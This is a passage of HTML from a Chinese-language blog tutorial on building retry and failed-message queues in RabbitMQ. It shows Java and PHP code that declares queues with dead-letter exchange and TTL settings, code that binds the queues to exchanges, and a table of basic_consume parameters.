data-line=\"crayon-5b623eb2c51cf495097658-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51cf495097658-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51cf495097658-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51cf495097658-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51cf495097658-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51cf495097658-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51cf495097658-1\"><span class=\"crayon-c\">// 声明监听队列</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51cf495097658-2\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueDeclare</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51cf495097658-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 队列名称</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51cf495097658-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">      </span><span class=\"crayon-c\">// durable</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51cf495097658-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// exclusive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51cf495097658-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// autoDelete</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51cf495097658-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\">       </span><span class=\"crayon-c\">// arguments</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51cf495097658-8\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51cf495097658-9\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"@failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51cf495097658-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51cf495097658-11\"><span class=\"crayon-e\">Map </span><span class=\"crayon-v\">arguments</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HashMap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51cf495097658-12\"><span class=\"crayon-v\">arguments</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"x-dead-letter-exchange\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">exchangeName</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51cf495097658-13\"><span class=\"crayon-v\">arguments</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"x-message-ttl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51cf495097658-14\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"@retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">arguments</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51d2913755297\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$this-&gt;channel-&gt;queue_declare($queueName, false, true, false, false, false);\r\n$this-&gt;channel-&gt;queue_declare($failedQueueName, false, true, false, false, false);\r\n$this-&gt;channel-&gt;queue_declare(\r\n    $retryQueueName, // 队列名称\r\n    false,           // passive\r\n    true,            // durable\r\n    false,           // exclusive\r\n    false,           // auto_delete\r\n    false,           // nowait\r\n    new AMQPTable([\r\n        'x-dead-letter-exchange' =&gt; 'master',\r\n        'x-message-ttl'          =&gt; 30 * 1000,\r\n    ])\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d2913755297-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d2913755297-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d2913755297-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d2913755297-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d2913755297-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d2913755297-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d2913755297-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d2913755297-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d2913755297-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d2913755297-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d2913755297-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d2913755297-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d2913755297-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d2913755297-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d2913755297-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d2913755297-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">failedQueueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d2913755297-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_declare</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d2913755297-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retryQueueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 队列名称</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d2913755297-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// passive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d2913755297-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// durable</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d2913755297-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// exclusive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d2913755297-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// auto_delete</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d2913755297-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// nowait</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d2913755297-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AMQPTable</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d2913755297-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-s\">'x-dead-letter-exchange'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d2913755297-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-s\">'x-message-ttl'</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d2913755297-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d2913755297-14\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0025 seconds] -->\r\n<p>在RabbitMQ的管理界面中，Queues部分可以看到我们创建的三个队列</p>\n<p><img title=\"\" src=\"https://segmentfault.com/img/remote/1460000014847795?w=1626&amp;h=284\" alt=\"\"></p>\n<p>查看队列的详细信息，我们可以看到 <strong>queueName@retry</strong> 队列与其它两个队列的不同</p>\n<p><img title=\"-w486\" src=\"https://segmentfault.com/img/remote/1460000014847796\" alt=\"-w486\"></p>\n<h4>Bind Exchange &amp; Queue</h4>\n<p>创建完队列之后，需要将队列与Exchange绑定（<code>bind</code>），不同队列需要绑定到之前创建的对应的Exchange上面</p>\n<table>\n<thead>\n<tr>\n<th>Queue</th>\n<th>Exchange</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[queue_name]</td>\n<td>master</td>\n</tr>\n<tr>\n<td>[queue_name]@retry</td>\n<td>master.retry</td>\n</tr>\n<tr>\n<td>[queue_name]@failed</td>\n<td>master.failed</td>\n</tr>\n</tbody>\n</table>\n<p>绑定时，需要提供订阅的路由KEY，该路由KEY与消息发布时的路由KEY对应，区别是这里可以使用通配符同时订阅多种类型的消息。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>queue</td>\n<td>–</td>\n<td>绑定的队列</td>\n</tr>\n<tr>\n<td>exchange</td>\n<td>–</td>\n<td>绑定的Exchange</td>\n</tr>\n<tr>\n<td>routing-key</td>\n<td>–</td>\n<td>订阅的消息路由规则</td>\n</tr>\n<tr>\n<td>no-wait</td>\n<td>false</td>\n<td>该方法需要应答确认</td>\n</tr>\n</tbody>\n</table>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51d6165779279\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 绑定监听队列到Exchange\r\nchannel.queueBind(queueName, \"master\", routingKey);\r\nchannel.queueBind(queueName + \"@failed\", \"master.failed\", routingKey);\r\nchannel.queueBind(queueName + \"@retry\", \"master.retry\", routingKey);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d6165779279-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d6165779279-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51d6165779279-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51d6165779279-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d6165779279-1\"><span class=\"crayon-c\">// 绑定监听队列到Exchange</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d6165779279-2\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueBind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"master\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51d6165779279-3\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueBind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"@failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"master.failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51d6165779279-4\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueBind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"@retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"master.retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51da303582690\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$this-&gt;channel-&gt;queue_bind($queueName, 'master', $routingKey);\r\n$this-&gt;channel-&gt;queue_bind($retryQueueName, 'master.retry', $routingKey);\r\n$this-&gt;channel-&gt;queue_bind($failedQueueName, 'master.failed', $routingKey);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51da303582690-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51da303582690-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51da303582690-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51da303582690-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51da303582690-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retryQueueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master.retry'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51da303582690-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">failedQueueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master.failed'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>在RabbitMQ的管理界面中，我们可以看到该队列与Exchange和routing-key的绑定关系</p>\n<p><img title=\"-w361\" src=\"https://segmentfault.com/img/remote/1460000014847797\" alt=\"-w361\"></p>\n<p><img title=\"-w405\" src=\"https://segmentfault.com/img/remote/1460000014847798\" alt=\"-w405\"></p>\n<p><img title=\"-w399\" src=\"https://segmentfault.com/img/remote/1460000014847799\" alt=\"-w399\"></p>\n<h4>消息消费实现</h4>\n<p>使用 <code>basic_consume</code> 对消息进行消费的时候，需要注意下面参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>queue</td>\n<td>–</td>\n<td>消费的队列名称</td>\n</tr>\n<tr>\n<td>consumer-tag</td>\n<td>–</td>\n<td>消费者标识，留空即可</td>\n</tr>\n<tr>\n<td>no_local</td>\n<td>false</td>\n<td>如果设置了该字段，服务器将不会发布消息到 发布它的客户端</td>\n</tr>\n<tr>\n<td>no_ack</td>\n<td>false</td>\n<td>需要消费确认应答</td>\n</tr>\n<tr>\n<td>exclusive</td>\n<td>false</td>\n<td>排他访问，设置后只允许当前消费者访问该队列</td>\n</tr>\n<tr>\n<td>nowait</td>\n<td>false</td>\n<td>该方法需要应答确认</td>\n</tr>\n</tbody>\n</table>\n<p>消费端在消费消息时，需要从消息中获取消息被消费的次数，以此判断该消息处理失败时重试还是发送到失败队列。</p>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51de852337675\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px 